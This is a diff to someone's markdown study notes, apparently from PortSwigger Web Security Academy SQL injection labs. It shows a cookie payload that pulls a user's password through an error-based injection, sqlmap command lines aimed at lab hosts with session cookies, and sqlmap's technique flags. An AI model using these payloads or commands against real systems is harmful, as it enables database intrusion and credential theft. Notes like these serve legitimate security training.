@@ -2841,9 +2841,11 @@ TrackingId=x'||CAST((SELECT password FROM users LIMIT 1) AS int)--;
 
 - SQLMAP essentials
 
-1. Parameter injection (Chrome > Network > Copy as cURL > Paste in terminal)
+Chrome > Network > Copy as cURL > Paste in terminal
+Begining of line -> Ctrl + A
+End of line -> Ctrl + E
 
-- to change line -> Ctrl + A
+1. Parameter injection:
 
 ```
 sudo sqlmap -u 'https://0af7006b04464bd581c17078008200aa.web-security-academy.net/filter?category=Pets \
@@ -2884,9 +2886,17 @@ sudo sqlmap -u 'https://0ab100de04e9e4a58031307800c600e6.web-security-academy.ne
   -H 'sec-fetch-user: ?1' \
   -H 'upgrade-insecure-requests: 1' \
   -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36' \
-  --cookie='TrackingId=TEaLoCAHZS25Ps7h; session=Mn2mKUuqpaCVXE9iNoXUQEnUaTRQJByV' -p 'TrackingId' --level 2 --flush-session
+  --cookie='TrackingId=TEaLoCAHZS25Ps7h; session=Mn2mKUuqpaCVXE9iNoXUQEnUaTRQJByV' -p 'TrackingId' --level 2 --flush-session [--technique=B]
 ```
 
+3. To indicate type of technique. Example: --technique=T. The list of techniques with its letters is as follows:
+4. 
+    B: Boolean-based blind
+    E: Error-based
+    U: Union query-based
+    S: Stacked queries
+    T: Time-based blind
+    Q: Inline queries
 -----
 
 ## JWT  
